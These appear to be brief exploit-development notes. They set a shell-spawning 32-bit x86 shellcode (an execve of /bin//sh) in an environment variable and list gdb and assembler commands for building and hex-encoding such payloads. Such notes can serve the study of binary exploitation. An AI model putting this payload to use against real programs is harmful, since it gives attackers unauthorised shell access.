
export SHELLCODE=$(python -c 'print "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"')

gdb: set follow-fork-mode child


as --32 code.asm
objcopy -O binary --only-section=.text a.out "< optionol output >"
xxd -p a.out | sed -E 's/([0-9a-z]{2})/\\x\1/g'